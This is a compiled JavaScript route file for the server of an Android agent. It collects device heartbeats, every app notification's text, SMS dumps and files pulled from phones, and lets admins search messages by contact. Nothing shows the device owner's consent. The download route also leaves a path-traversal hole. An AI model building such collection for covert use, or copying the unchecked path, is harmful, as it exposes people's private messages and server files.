"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.devicesRoutes = devicesRoutes;
const zod_1 = require("zod");
const DeviceService_1 = require("../services/DeviceService");
const auth_middleware_1 = require("../middleware/auth.middleware");
const deviceAuth_middleware_1 = require("../middleware/deviceAuth.middleware");
const ConnectionRegistry_1 = require("../websocket/ConnectionRegistry");
const config_1 = require("../config");
const prisma_1 = __importDefault(require("../db/prisma"));
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const RegisterSchema = zod_1.z.object({
    androidId: zod_1.z.string().min(1),
    serialNumber: zod_1.z.string().optional(),
    model: zod_1.z.string().min(1),
    manufacturer: zod_1.z.string().min(1),
    androidVersion: zod_1.z.string().min(1),
    sdkVersion: zod_1.z.number().int(),
    agentVersion: zod_1.z.string().min(1),
    enrollmentToken: zod_1.z.string().min(1),
});
async function devicesRoutes(app) {
    // -----------------------------------------------------------
    // POST /api/v1/devices/register  (لا تحتاج admin auth)
    // -----------------------------------------------------------
    app.post('/register', async (request, reply) => {
        const parseResult = RegisterSchema.safeParse(request.body);
        if (!parseResult.success) {
            return reply.status(400).send({ error: 'VALIDATION_ERROR', details: parseResult.error.errors });
        }
        try {
            const result = await DeviceService_1.DeviceService.registerDevice(parseResult.data);
            return reply.status(201).send(result);
        }
        catch (err) {
            const error = err;
            if (error.message === 'INVALID_ENROLLMENT_TOKEN') {
                return reply.status(403).send({ error: 'INVALID_ENROLLMENT_TOKEN', message: 'Enrollment token is invalid' });
            }
            throw err;
        }
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices  (admin required)
    // -----------------------------------------------------------
    app.get('/', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const devices = await DeviceService_1.DeviceService.getAllDevices();
        return reply.send({ devices, total: devices.length });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid  (admin required)
    // -----------------------------------------------------------
    app.get('/:deviceUid', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const device = await DeviceService_1.DeviceService.getDeviceByUid(deviceUid);
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND', message: `Device ${deviceUid} not found` });
        }
        return reply.send({ device });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/stats  (admin required)
    // -----------------------------------------------------------
    app.get('/stats', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const allDevices = await DeviceService_1.DeviceService.getAllDevices();
        const onlineCount = allDevices.filter((d) => d.isOnline).length;
        return reply.send({
            total: allDevices.length,
            online: onlineCount,
            offline: allDevices.length - onlineCount,
            wsStats: ConnectionRegistry_1.ConnectionRegistry.getStats(),
        });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid/heartbeat/latest  (admin required)
    // يُرجع آخر heartbeat مخزّن في DB بغض النظر عن حالة الاتصال
    // -----------------------------------------------------------
    app.get('/:deviceUid/heartbeat/latest', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const device = await DeviceService_1.DeviceService.getDeviceByUid(deviceUid);
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        const latest = await prisma_1.default.heartbeat.findFirst({
            where: { deviceId: device.id },
            orderBy: { receivedAt: 'desc' },
        });
        if (!latest) {
            return reply.send({ heartbeat: null });
        }
        // إرجاع البيانات بنفس شكل heartbeat الـ WebSocket لسهولة الاستخدام في الـ Dashboard
        return reply.send({
            heartbeat: {
                battery: {
                    level: latest.batteryLevel,
                    isCharging: latest.isCharging,
                    chargingType: latest.chargingType,
                },
                network: {
                    type: latest.networkType,
                    isConnected: latest.isConnected,
                    wifiSignalLevel: latest.wifiSignalLevel,
                    mobileNetworkType: latest.mobileNetType,
                },
                storage: {
                    usedPercent: latest.usedPercent,
                    freeBytes: Number(latest.storageFreeBytes),
                    totalBytes: Number(latest.storageTotalBytes),
                },
                recordedAt: latest.receivedAt, // receivedAt في DB = recordedAt في الـ Dashboard
            },
        });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid/notifications  (admin required)
    // -----------------------------------------------------------
    app.get('/:deviceUid/notifications', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const page = Math.max(1, parseInt(request.query.page || '1', 10));
        const limit = Math.min(200, parseInt(request.query.limit || '50', 10));
        const device = await DeviceService_1.DeviceService.getDeviceByUid(deviceUid);
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        // Get total count for pagination
        const total = await prisma_1.default.notificationLog.count({
            where: { deviceId: device.id },
        });
        // Get paginated results
        const notifications = await prisma_1.default.notificationLog.findMany({
            where: { deviceId: device.id },
            orderBy: { postedAt: 'desc' },
            skip: (page - 1) * limit,
            take: limit,
        });
        return reply.send({
            notifications,
            total,
            page,
            limit,
            pages: Math.ceil(total / limit),
        });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid/notifications/all  (admin required)
    // For chat view - returns ALL notifications grouped by app
    // -----------------------------------------------------------
    app.get('/:deviceUid/notifications/all', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const device = await DeviceService_1.DeviceService.getDeviceByUid(deviceUid);
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        // Get ALL notifications (no pagination for chat view)
        const notifications = await prisma_1.default.notificationLog.findMany({
            where: { deviceId: device.id },
            orderBy: { postedAt: 'asc' }, // Oldest first for chat view
        });
        // Group by packageName
        const grouped = notifications.reduce((acc, n) => {
            const pkg = n.packageName || 'unknown';
            if (!acc[pkg]) {
                acc[pkg] = {
                    packageName: pkg,
                    appName: n.appName || pkg,
                    count: 0,
                    notifications: [],
                };
            }
            acc[pkg].count++;
            acc[pkg].notifications.push({
                id: n.id,
                title: n.title,
                text: n.text,
                category: n.category,
                postedAt: n.postedAt,
                receivedAt: n.receivedAt,
            });
            return acc;
        }, {});
        // Convert to array and sort by count (most notifications first)
        const apps = Object.values(grouped).sort((a, b) => b.count - a.count);
        return reply.send({
            total: notifications.length,
            apps,
        });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid/files  (admin required)
    // -----------------------------------------------------------
    app.get('/:deviceUid/files', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const limit = parseInt(request.query.limit || '20', 10);
        const fileType = request.query.fileType;
        const device = await DeviceService_1.DeviceService.getDeviceByUid(deviceUid);
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        const files = await prisma_1.default.backupFile.findMany({
            where: {
                deviceId: device.id,
                ...(fileType ? { fileType } : {}),
            },
            orderBy: { createdAt: 'desc' },
            take: limit,
        });
        return reply.send({ files, total: files.length });
    });
    // -----------------------------------------------------------
    // POST /api/v1/devices/:deviceUid/files/upload-sms
    // يُستدعى من الـ Agent مباشرة (device auth)
    // -----------------------------------------------------------
    app.post('/:deviceUid/files/upload-sms', { preHandler: deviceAuth_middleware_1.requireDevice }, async (request, reply) => {
        const { deviceUid } = request.params;
        const body = request.body;
        if (!body || !Array.isArray(body.messages)) {
            return reply.status(400).send({ error: 'INVALID_BODY', message: 'messages array is required' });
        }
        // جلب الجهاز
        const device = await prisma_1.default.device.findUnique({ where: { deviceUid } });
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        // إنشاء مجلد الحفظ
        const timestamp = new Date().toISOString().replace(/[:.]/g, '').slice(0, 15);
        const fileName = `sms_${timestamp}.json`;
        const dirPath = path_1.default.resolve(config_1.config.fileStoragePath, 'backups', deviceUid);
        const filePath = path_1.default.join(dirPath, fileName);
        const fileKey = `backups/${deviceUid}/${fileName}`;
        fs_1.default.mkdirSync(dirPath, { recursive: true });
        fs_1.default.writeFileSync(filePath, JSON.stringify({
            exportedAt: new Date().toISOString(),
            deviceUid,
            commandId: body.commandId,
            totalCount: body.messages.length,
            messages: body.messages,
        }, null, 2), 'utf8');
        const fileSizeBytes = BigInt(fs_1.default.statSync(filePath).size);
        // حفظ السجل في DB
        await prisma_1.default.backupFile.create({
            data: {
                deviceId: device.id,
                commandId: body.commandId,
                fileType: 'sms',
                fileKey,
                fileName,
                fileSizeBytes,
                recordCount: body.messages.length,
                storageProvider: 'local',
                mimeType: 'application/json',
            },
        });
        console.log(`[FilesRoute] SMS backup saved: ${fileKey} (${body.messages.length} messages)`);
        return reply.status(201).send({ fileKey, recordCount: body.messages.length });
    });
    // -----------------------------------------------------------
    // POST /api/v1/devices/:deviceUid/files/upload
    // يستقبل ملفات عامة عبر Multipart (بواسطة PullFileCommand)
    // -----------------------------------------------------------
    app.post('/:deviceUid/files/upload', { preHandler: deviceAuth_middleware_1.requireDevice }, async (request, reply) => {
        const { deviceUid } = request.params;
        const data = await request.file();
        if (!data) {
            return reply.status(400).send({ error: 'MISSING_FILE', message: 'No file uploaded' });
        }
        const device = await prisma_1.default.device.findUnique({ where: { deviceUid } });
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        // قراءة الـ fields الأخرى مثل commandId (إن وُجد)
        const commandId = data.fields.commandId ? data.fields.commandId.value : undefined;
        // إنشاء مجلد الحفظ
        const timestamp = new Date().toISOString().replace(/[:.]/g, '').slice(0, 15);
        const originalName = data.filename.replace(/[^a-zA-Z0-9.-]/g, '_');
        const fileName = `file_${timestamp}_${originalName}`;
        const dirPath = path_1.default.resolve(config_1.config.fileStoragePath, 'backups', deviceUid);
        const filePath = path_1.default.join(dirPath, fileName);
        const fileKey = `backups/${deviceUid}/${fileName}`;
        fs_1.default.mkdirSync(dirPath, { recursive: true });
        // حفظ الملف على الـ Disk
        const writeStream = fs_1.default.createWriteStream(filePath);
        await new Promise((resolve, reject) => {
            data.file.pipe(writeStream)
                .on('finish', resolve)
                .on('error', reject);
        });
        const fileSizeBytes = BigInt(fs_1.default.statSync(filePath).size);
        // حفظ السجل في قاعدة البيانات
        await prisma_1.default.backupFile.create({
            data: {
                deviceId: device.id,
                commandId: commandId,
                fileType: 'generic',
                fileKey,
                fileName,
                fileSizeBytes,
                storageProvider: 'local',
                mimeType: data.mimetype || 'application/octet-stream',
            },
        });
        console.log(`[FilesRoute] File saved: ${fileKey} (${fileSizeBytes} bytes)`);
        return reply.status(201).send({ fileKey, fileName, size: Number(fileSizeBytes) });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid/files/:fileKey/download
    // تحميل ملف backup (admin only)
    // -----------------------------------------------------------
    app.get('/:deviceUid/files/download/*', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const subPath = request.params['*'];
        const filePath = path_1.default.resolve(config_1.config.fileStoragePath, 'backups', deviceUid, subPath);
        if (!fs_1.default.existsSync(filePath)) {
            return reply.status(404).send({ error: 'FILE_NOT_FOUND' });
        }
        const stream = fs_1.default.createReadStream(filePath);
        reply.header('Content-Type', 'application/json');
        reply.header('Content-Disposition', `attachment; filename="${path_1.default.basename(filePath)}"`);
        return reply.send(stream);
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid/sms/:backupFileId/messages
    // قراءة رسائل SMS من ملف backup مع pagination وبحث
    // -----------------------------------------------------------
    app.get('/:deviceUid/sms/:backupFileId/messages', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid, backupFileId } = request.params;
        const page = Math.max(1, parseInt(request.query.page || '1', 10));
        const limit = Math.min(200, parseInt(request.query.limit || '100', 10));
        const search = (request.query.search || '').trim().toLowerCase();
        const contact = (request.query.contact || '').trim().toLowerCase();
        const threadId = request.query.threadId || '';
        const typeFilter = request.query.type || 'all';
        // جلب سجل الملف من DB
        const backupFile = await prisma_1.default.backupFile.findUnique({
            where: { id: backupFileId },
            include: { device: { select: { deviceUid: true } } },
        });
        if (!backupFile || backupFile.device.deviceUid !== deviceUid) {
            return reply.status(404).send({ error: 'BACKUP_FILE_NOT_FOUND' });
        }
        const filePath = path_1.default.resolve(config_1.config.fileStoragePath, backupFile.fileKey);
        if (!fs_1.default.existsSync(filePath)) {
            return reply.status(404).send({ error: 'FILE_NOT_FOUND_ON_DISK' });
        }
        // قراءة وتحليل الملف
        const raw = fs_1.default.readFileSync(filePath, 'utf8');
        const data = JSON.parse(raw);
        let messages = data.messages;
        // ---- فلترة ----
        if (typeFilter === 'inbox')
            messages = messages.filter(m => m.type === 'inbox');
        else if (typeFilter === 'sent')
            messages = messages.filter(m => m.type === 'sent');
        if (threadId)
            messages = messages.filter(m => m.threadId === threadId);
        if (contact)
            messages = messages.filter(m => m.address.toLowerCase().includes(contact));
        if (search)
            messages = messages.filter(m => m.body.toLowerCase().includes(search) ||
                m.address.toLowerCase().includes(search));
        // ---- إحصائيات جهات الاتصال (contacts list) ----
        const contactsMap = new Map();
        for (const m of data.messages) {
            const addr = m.address;
            if (!contactsMap.has(addr)) {
                contactsMap.set(addr, { address: addr, count: 0, lastDate: 0, threadIds: new Set() });
            }
            const c = contactsMap.get(addr);
            c.count++;
            if (m.dateMs > c.lastDate)
                c.lastDate = m.dateMs;
            c.threadIds.add(m.threadId);
        }
        const contacts = [...contactsMap.values()]
            .sort((a, b) => b.lastDate - a.lastDate)
            .map(c => ({ address: c.address, count: c.count, lastDate: c.lastDate, threadCount: c.threadIds.size }));
        // ---- Pagination ----
        const total = messages.length;
        const offset = (page - 1) * limit;
        const paged = messages.slice(offset, offset + limit);
        return reply.send({
            meta: {
                backupFileId,
                fileName: backupFile.fileName,
                exportedAt: data.exportedAt,
                deviceUid: data.deviceUid,
                totalInFile: data.totalCount,
            },
            pagination: {
                total,
                page,
                limit,
                pages: Math.ceil(total / limit),
            },
            contacts, // قائمة جهات الاتصال مع عدد الرسائل
            messages: paged,
        });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid/sms  – قائمة ملفات الـ SMS
    // -----------------------------------------------------------
    app.get('/:deviceUid/sms', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const device = await DeviceService_1.DeviceService.getDeviceByUid(deviceUid);
        if (!device)
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        const files = await prisma_1.default.backupFile.findMany({
            where: {
                deviceId: device.id,
                fileType: 'sms',
            },
            orderBy: { createdAt: 'desc' },
        });
        return reply.send({ files });
    });
}
//# sourceMappingURL=devices.routes.js.map